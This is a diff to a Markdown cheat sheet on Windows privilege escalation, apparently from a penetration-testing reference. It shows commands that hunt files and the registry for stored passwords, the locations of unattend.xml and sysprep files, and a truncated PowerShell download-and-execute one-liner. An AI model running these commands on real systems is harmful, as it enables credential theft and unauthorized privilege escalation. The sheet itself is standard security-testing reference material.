@@ -92,28 +92,29 @@ net share
 
 ## Looting for passwords
 
-Search for file contents
+### Search for file contents**
 ```powershell
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 ```
 
-Search for a file with a certain filename
+### Search for a file with a certain filename
 ```powershell
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 ```
 
-Search the registry for key names
+### Search the registry for key names
 ```powershell
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 ```
 
-Read a value of a certain sub key
+### Read a value of a certain sub key
 ```powershell
 REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 ```
 
-Password in unattend.xml
+### Password in unattend.xml
+Location of the unattend.xml files
 ```powershell
 C:\unattend.xml
 C:\Windows\Panther\Unattend.xml
@@ -121,6 +122,8 @@ C:\Windows\Panther\Unattend\Unattend.xml
 C:\Windows\system32\sysprep.inf
 C:\Windows\system32\sysprep\sysprep.xml
 ```
+
+Example content
 ```powershell
    <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
     <AutoLogon>
@@ -183,3 +186,5 @@ powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadS
 * [The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte](https://addaxsoft.com/wpecs/)
 * [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
 * [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
+* [TOP–10 ways to boost your privileges in Windows systems - hackmag](https://hackmag.com/security/elevating-privileges-to-administrative-and-further/)
+* [The SYSTEM Challenge](https://decoder.cloud/2017/02/21/the-system-challenge/)
